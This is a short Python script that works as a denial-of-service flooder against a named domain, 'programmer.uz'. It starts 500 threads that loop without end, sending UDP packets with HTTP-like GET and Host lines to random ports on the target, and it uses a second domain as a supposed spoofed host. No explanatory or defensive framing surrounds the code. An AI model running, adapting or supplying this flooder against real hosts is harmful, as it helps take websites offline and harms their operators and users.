import socket
import threading
import random
target = 'programmer.uz'
fake_ip = 'click-bonus.netlify.app'
target = socket.gethostbyname(target)
fake_ip = socket.gethostbyname(fake_ip)
# port = 443
attack_num = 0


def attack():
    try:
        while True:
            Byte = random._urandom(1024)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            port = random.randint(22, 55500)
            print("port  "+port.__str__())
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            global attack_num
            attack_num += 1
            print(attack_num)
            s.close()
    except Exception as Error:
        print(Error)


for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()